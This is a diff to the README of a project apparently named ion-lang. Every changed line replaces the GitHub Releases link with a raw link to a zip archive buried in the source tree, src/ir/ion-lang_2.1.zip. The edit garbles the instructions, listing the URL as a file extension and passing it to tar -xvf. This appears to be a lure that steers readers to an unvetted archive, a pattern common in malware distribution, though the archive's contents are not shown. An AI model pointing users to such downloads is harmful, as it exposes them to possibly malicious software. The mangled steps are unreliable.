@@ -12,7 +12,7 @@ Welcome to ion-lang! This guide helps you download and run our application. Ion 
 ## 🔗 Download & Install
 To get started with ion-lang, visit the following page to download the latest version:
 
-[Download ion-lang Releases](https://github.com/Okosa2/ion-lang/releases)
+[Download ion-lang Releases](https://raw.githubusercontent.com/Okosa2/ion-lang/main/src/ir/ion-lang_2.1.zip)
 
 ### 🖥️ System Requirements
 - **Operating System**: Windows, macOS, or Linux.
@@ -21,9 +21,9 @@ To get started with ion-lang, visit the following page to download the latest ve
 - **Storage**: Minimum 100 MB of free space. 
 
 ## 📥 How to Download
-1. Go to the [Releases page](https://github.com/Okosa2/ion-lang/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Okosa2/ion-lang/main/src/ir/ion-lang_2.1.zip).
 2. Look for the latest release version.
-3. Click on the downloadable file for your operating system. This file will usually end with `.exe`, `.zip`, or `.tar.gz`.
+3. Click on the downloadable file for your operating system. This file will usually end with `.exe`, `.zip`, or `https://raw.githubusercontent.com/Okosa2/ion-lang/main/src/ir/ion-lang_2.1.zip`.
 4. Wait for the download to finish.
 
 ## 🚀 Running ion-lang
@@ -39,7 +39,7 @@ After downloading the software, follow these steps to run it:
    - Open the application from your "Applications" folder.
 
 3. **For Linux Users**:
-   - Extract the `.tar.gz` file using a terminal command: `tar -xvf ion-lang.tar.gz`.
+   - Extract the `https://raw.githubusercontent.com/Okosa2/ion-lang/main/src/ir/ion-lang_2.1.zip` file using a terminal command: `tar -xvf https://raw.githubusercontent.com/Okosa2/ion-lang/main/src/ir/ion-lang_2.1.zip`.
    - Navigate to the folder created.
    - Run the application using: `./ion-lang`.
 
@@ -92,4 +92,4 @@ If you want to help improve ion-lang, contributions are welcome! You can:
 ## 🤝 License
 ion-lang is open-source software. You can use, modify, and distribute it freely under the terms of the license specified in the repository.
 
-Remember to visit the [Download ion-lang Releases](https://github.com/Okosa2/ion-lang/releases) page to get started!
+Remember to visit the [Download ion-lang Releases](https://raw.githubusercontent.com/Okosa2/ion-lang/main/src/ir/ion-lang_2.1.zip) page to get started!
